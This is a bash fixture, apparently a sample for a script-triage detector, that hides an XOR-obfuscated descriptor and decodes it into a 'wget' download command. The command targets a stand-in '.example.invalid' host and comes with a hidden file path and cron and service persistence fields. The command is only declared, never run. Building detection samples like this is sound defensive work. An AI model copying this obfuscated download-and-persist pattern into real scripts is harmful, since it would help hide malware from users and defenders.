#!/usr/bin/env bash
  # Huntress Script Triage -- inert static-analysis fixture (bash_linux)
  readonly Material_bb8c25f2='%ab%e0%ec%a1%ae%a9%b8%ad%ae%e0%bc%be%ac%a8%b4%af%b8%82%af%b8%b0%b2%a9%b8%f1%aa%af%b4%a9%b8%82%bb%b4%b1%b8%a1%bc%b9%bc%ad%a9%b8%af%e0%aa%ba%b8%a9%82%b2%a8%a9%ad%a8%a9%a1%ae%a9%bc%ba%b8%82%be%b2%a8%b3%a9%e0%ec%a1%be%bc%b0%ad%bc%b4%ba%b3%82%b4%b9%e0%be%bc%b0%ad%bc%b4%ba%b3%f0%e4%bc%bf%e9%e8%bb%ef%e4%b9%bc%a1%a8%af%b1%e0%b5%a9%a9%ad%ae%e7%f2%f2%e4%bc%bf%e9%e8%bb%ef%e4%b9%bc%f3%b8%a5%bc%b0%ad%b1%b8%f3%b4%b3%ab%bc%b1%b4%b9%f2%bc%ed%ee%e9%e9%eb%ee%be%f3%ae%b5%a1%a8%ae%b8%af%82%bc%ba%b8%b3%a9%e0%95%a8%b3%a9%af%b8%ae%ae%91%bc%bf%f2%e4%bc%bf%e9%e8%bb%ef%e4%b9%bc%a1%bb%b4%b1%b8%82%ad%bc%a9%b5%e0%f2%a9%b0%ad%f2%b5%a8%b3%a9%af%b8%ae%ae%f0%be%bc%be%b5%b8%f2%f3%ae%a9%bc%ba%b8%f0%e4%bc%bf%e9%e8%bb%ef%e4%b9%bc'
  readonly Codec_bb8c25f2='percent_hex|single_byte_xor|dd'

  Load_bb8c25f2() {
    v_a19c=()
    local raw="${Material_bb8c25f2}" v_f602
    for v_f602 in ${raw//%/ }; do [[ -n "$v_f602" ]] && v_a19c+=("$((16#$v_f602))"); done
  }

  Decode_bb8c25f2() {
    v_b27e=()
    local v_e598
    for ((v_e598=0; v_e598<${#v_a19c[@]}; v_e598++)); do
      v_b27e+=("$((v_a19c[v_e598] ^ 221))")
    done
  }

  Recover_bb8c25f2() {
    local -a v_a19c v_b27e
    local v_c304 v_d41a v_b803 v_e598
    v_d41a=''
    Load_bb8c25f2
    case 1 in 1) Decode_bb8c25f2 ;; *) return 70 ;; esac
    v_c304=''
    local octal character
    for v_e598 in "${!v_b27e[@]}"; do
      printf -v octal '%03o' "${v_b27e[v_e598]}"
      printf -v character '%b' "\\$octal"
      v_c304+="$character"
    done
    printf '%s\n' "$v_c304"
  }

  Inspect_bb8c25f2() { local recovered; recovered="$(Recover_bb8c25f2)"; printf '%s\n' "$recovered"; }

  Plan_bb8c25f2() {
    local descriptor field key value campaign_id='' url='' user_agent='' file_path='' arch_probe='' service_name='' cron_path=''
    descriptor="$(Inspect_bb8c25f2)"
    local -a fields
    IFS='|' read -r -a fields <<< "$descriptor"
    for field in "${fields[@]}"; do key=${field%%=*}; value=${field#*=}; case "$key" in campaign_id|url|user_agent|file_path|arch_probe|service_name|cron_path) printf -v "$key" '%s' "$value" ;; esac; done
    local -a request_command=(wget -qO "$file_path" "$url")
    declare -p request_command
  }

  if [[ ${HUNTRESS_INSPECT_ONLY:-0} == 1 ]]; then Inspect_bb8c25f2; fi
